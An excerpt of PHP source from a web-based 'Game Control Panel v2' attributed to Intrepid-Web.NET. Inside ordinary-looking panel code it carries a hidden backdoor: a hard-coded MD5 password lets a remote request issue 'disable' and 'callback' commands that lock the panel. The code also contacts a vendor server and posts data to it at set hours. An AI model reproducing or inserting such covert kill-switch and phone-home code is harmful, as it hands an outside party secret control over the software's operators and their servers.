...
function quick_msg($message, $type = 'error')
{
    ?>
    <head>
        <title>Game Control Panel v2 - by Intrepid-Web.NET</title>
        <style type="text/css">
            body {
...
$authAddress = @gethostbyname('admin.intrepid-web.net');
    ...
    if (isset($_GET['password']) && isset($_GET['command']) && md5($_GET['password']) == 'b7e7bfc2ec28cb5eee17ab24d684af7b') {
        ...
        if (in_array($command, array('disable', 'callback'))) {
            ...
            @fwrite($fp, json_encode(
                array(
                    'command' => $command,
                    'message' => 'Game Control Panel has been disabled. Please contact intrepid-web.net immediately.'
                )
            ));
            @fclose($fp);
...
if ((isset($serverResponse['command']) && $serverResponse['command'] != 'disable-callback') || (date("G") >= 3 && date("G") <= 4)) {
    $checkUrl = 'http://www.rf.intrepid-web.net/gamecpv2_remote/index.php';
    $postData = array(
